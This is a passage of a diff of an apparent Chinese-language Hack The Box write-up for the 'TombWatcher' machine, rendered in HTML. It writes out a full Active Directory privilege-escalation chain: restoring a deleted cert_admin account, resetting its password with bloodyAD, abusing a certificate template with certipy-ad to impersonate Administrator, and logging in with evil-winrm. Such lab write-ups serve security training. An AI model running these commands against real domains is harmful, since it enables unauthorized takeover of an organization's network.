+dSCorePropagationData           <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token number">11</span>/16/2024 <span class="token number">12</span>:07:10 PM, <span class="token number">11</span>/16/2024 <span class="token number">12</span>:07:08 PM, <span class="token number">12</span>/31/1600 <span class="token number">7</span>:00:00 PM<span class="token punctuation">&#125;</span>
+givenName                       <span class="token builtin class-name">:</span> cert_admin
+instanceType                    <span class="token builtin class-name">:</span> <span class="token number">4</span>
+isDeleted                       <span class="token builtin class-name">:</span> True
+LastKnownParent                 <span class="token builtin class-name">:</span> <span class="token assign-left variable">OU</span><span class="token operator">=</span>ADCS,DC<span class="token operator">=</span>tombwatcher,DC<span class="token operator">=</span>htb
+lastLogoff                      <span class="token builtin class-name">:</span> <span class="token number">0</span>
+lastLogon                       <span class="token builtin class-name">:</span> <span class="token number">0</span>
+logonCount                      <span class="token builtin class-name">:</span> <span class="token number">0</span>
+Modified                        <span class="token builtin class-name">:</span> <span class="token number">11</span>/16/2024 <span class="token number">12</span>:07:27 PM
+modifyTimeStamp                 <span class="token builtin class-name">:</span> <span class="token number">11</span>/16/2024 <span class="token number">12</span>:07:27 PM
+msDS-LastKnownRDN               <span class="token builtin class-name">:</span> cert_admin
+Name                            <span class="token builtin class-name">:</span> cert_admin
+                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+nTSecurityDescriptor            <span class="token builtin class-name">:</span> System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  <span class="token builtin class-name">:</span>
+ObjectClass                     <span class="token builtin class-name">:</span> user
+ObjectGUID                      <span class="token builtin class-name">:</span> 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+objectSid                       <span class="token builtin class-name">:</span> S-1-5-21-1392491010-1358638721-2126982587-1111
+primaryGroupID                  <span class="token builtin class-name">:</span> <span class="token number">513</span>
+ProtectedFromAccidentalDeletion <span class="token builtin class-name">:</span> False
+pwdLastSet                      <span class="token builtin class-name">:</span> <span class="token number">133762504248946345</span>
+sAMAccountName                  <span class="token builtin class-name">:</span> cert_admin
+sDRightsEffective               <span class="token builtin class-name">:</span> <span class="token number">7</span>
+sn                              <span class="token builtin class-name">:</span> cert_admin
+userAccountControl              <span class="token builtin class-name">:</span> <span class="token number">66048</span>
+uSNChanged                      <span class="token builtin class-name">:</span> <span class="token number">13197</span>
+uSNCreated                      <span class="token builtin class-name">:</span> <span class="token number">13186</span>
+whenChanged                     <span class="token builtin class-name">:</span> <span class="token number">11</span>/16/2024 <span class="token number">12</span>:07:27 PM
+whenCreated                     <span class="token builtin class-name">:</span> <span class="token number">11</span>/16/2024 <span class="token number">12</span>:07:04 PM<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li><p>恢复账号</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Restore-ADObject <span class="token parameter variable">-Identity</span> <span class="token string">"CN=cert_admin<span class="token entity" title="\0">\0</span>ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"</span>
+bloodyAD <span class="token parameter variable">--host</span> <span class="token number">10.10</span>.11.72 <span class="token parameter variable">-u</span> john <span class="token parameter variable">-p</span> HackTheBox <span class="token parameter variable">-d</span> tombwatcher.htb remove uac cert_admin <span class="token parameter variable">-f</span> ACCOUNTDISABLE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/assets/image-20250630133224-610cjd7.png" alt="image"></p>
+</li>
+<li><p>更改密码</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bloodyAD <span class="token parameter variable">--host</span> <span class="token number">10.10</span>.11.72 <span class="token parameter variable">-u</span> john <span class="token parameter variable">-p</span> HackTheBox <span class="token parameter variable">-d</span> tombwatcher <span class="token builtin class-name">set</span> password cert_admin HackTheBox<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/assets/image-20250630133332-z83i29r.png" alt="image"></p>
+</li>
+<li><p>证书利用</p>
+<p>检测</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">certipy-ad <span class="token function">find</span> <span class="token parameter variable">-u</span> <span class="token string">'cert_admin'</span> <span class="token parameter variable">-p</span> <span class="token string">'HackTheBox'</span> -dc-ip <span class="token string">'10.10.11.72'</span> <span class="token parameter variable">-vulnerable</span> <span class="token parameter variable">-text</span> <span class="token parameter variable">-enabled</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/assets/image-20250713200717-y9ngr3y.png" alt="image"></p>
+<p>利用</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">certipy-ad req <span class="token punctuation">\</span>
+    <span class="token parameter variable">-u</span> <span class="token string">'cert_admin@tombwatcher.htb'</span> <span class="token parameter variable">-p</span> <span class="token string">'HackTheBox'</span> <span class="token punctuation">\</span>
+    -dc-ip <span class="token string">'10.129.238.123'</span> <span class="token parameter variable">-target</span> <span class="token string">'DC01.tombwatcher.htb'</span> <span class="token punctuation">\</span>
+    <span class="token parameter variable">-ca</span> <span class="token string">'tombwatcher-CA-1'</span> <span class="token parameter variable">-template</span> <span class="token string">'WebServer'</span> <span class="token punctuation">\</span>
+    <span class="token parameter variable">-upn</span> <span class="token string">'administrator@tombwatcher.htb'</span>  <span class="token punctuation">\</span>
+    -application-policies <span class="token string">'Client Authentication'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/assets/image-20250713201158-pkj7lqp.png" alt="image"></p>
+<p>证明</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">certipy-ad auth <span class="token parameter variable">-pfx</span> <span class="token string">'administrator.pfx'</span> -dc-ip <span class="token string">'10.129.238.123'</span> -ldap-shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/assets/image-20250713201327-7i156uz.png" alt="image"></p>
+<p>登录</p>
+<pre class="line-numbers language-伪代码" data-language="伪代码"><code class="language-伪代码">evil-winrm -u Administrator -p HackTheBox -i 10.129.238.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/assets/image-20250713201434-phxvrhf.png" alt="image"></p>
+<p>获取Flag</p>
+<p><img src="/assets/image-20250713201619-xyk8tzx.png" alt="image"></p>
+</li>
+</ul>
+<p>‍</p>
 <p>‍</p>
 
   </div>
@@ -344,7 +527,7 @@ SMB         <span class="token number">10.129</span>.29.246   <span class="token
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TombWatcher"><span class="toc-number">1.</span> <span class="toc-text">TombWatcher</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集：</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TombWatcher"><span class="toc-number">1.</span> <span class="toc-text">TombWatcher</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.2.</span> <span class="toc-text">横向移动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.3.</span> <span class="toc-text">域内权限提升</span></a></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
